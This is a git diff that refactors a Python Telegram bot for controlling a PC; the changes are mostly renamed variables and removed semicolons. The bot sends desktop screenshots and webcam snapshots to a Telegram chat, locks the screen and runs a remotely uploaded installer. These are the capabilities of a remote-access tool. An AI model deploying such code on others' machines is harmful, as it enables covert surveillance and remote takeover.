@@ -1,9 +1,7 @@
-import time
-import os
+import cv2
 from dotenv import dotenv_values
 from telebot import *
 import socket
-import cv2
 import subprocess
 import time
 from tkinter import *
@@ -131,25 +129,23 @@ def scr(message):
     print(f">>> func(scr) run by Callback Data 'scr'            <{message.from_user.id} : {message.chat.id}>")
     im1 = pyautogui.screenshot()
     im1.save(r"data/img/git.png")
-    photo = open('data/img/git.png', 'rb')
-    select = types.InlineKeyboardMarkup()
-    btn1 = types.InlineKeyboardButton("вернуться в главное меню", callback_data='main_menu1')
-    select.add(btn1)
-    bot.send_photo(message.chat.id, photo, caption="Скриншот экрана пк", reply_markup=select)
+    image = open('data/img/git.png', 'rb')
+    bot.send_photo(message.chat.id, image, caption="Скриншот экрана пк", reply_markup=types.InlineKeyboardMarkup()
+                   .add(types.InlineKeyboardButton("вернуться в главное меню", callback_data='main_menu1')))
     bot.delete_message(message.chat.id, message_id=message.message_id)
 
 
 def photo(message):
-    print(f">>> func(scr) run by Callback Data 'scr'            <{message.from_user.id} : {message.chat.id}>")
+    print(f">>> func(photo) run by Callback Data 'photo'            <{message.from_user.id} : {message.chat.id}>")
     cap = cv2.VideoCapture(0)
     ret, frame = cap.read()
     cv2.imwrite('data/img/cam.png', frame)
     cap.release()
-    photo = open('data/img/cam.png', 'rb')
+    img = open('data/img/cam.png', 'rb')
     select = types.InlineKeyboardMarkup()
     btn1 = types.InlineKeyboardButton("вернуться в главное меню", callback_data='main_menu1')
     select.add(btn1)
-    bot.send_photo(message.chat.id, photo, caption="Снимок", reply_markup=select)
+    bot.send_photo(message.chat.id, img, caption="Снимок", reply_markup=select)
     bot.delete_message(message.chat.id, message_id=message.message_id)
 
 
@@ -259,42 +255,42 @@ def save_upd(message):
 @bot.callback_query_handler(func=lambda callback: True)
 def handle_query(callback):
     if callback.data == 'scr':
-        time.sleep(1);
+        time.sleep(1)
         scr(callback.message)
 
     elif callback.data == '0':
         pass
 
     elif callback.data == 'photo':
-        time.sleep(1);
+        time.sleep(1)
         photo(callback.message)
 
     elif callback.data == 'upload_update':
-        time.sleep(1);
+        time.sleep(1)
         upload_upd(callback.message)
 
     elif callback.data == 'install_update':
-        time.sleep(1);
+        time.sleep(1)
         run_installer()
 
     elif callback.data == 'info':
-        time.sleep(1);
+        time.sleep(1)
         await_start(callback.message)
 
     elif callback.data == 'lock_pc':
-        time.sleep(0.5);
+        time.sleep(0.5)
         select_fon(callback.message)
 
     elif callback.data == 'lock_pc_first_img':
-        time.sleep(1);
+        time.sleep(1)
         lock(callback.message, img=1)
 
     elif callback.data == 'lock_pc_second_img':
-        time.sleep(1);
+        time.sleep(1)
         lock(callback.message, img=2)
 
     elif callback.data == "blur":
-        time.sleep(1);
+        time.sleep(1)
         lock(callback.message, img=3)
 
     elif callback.data == 'main_menu1':
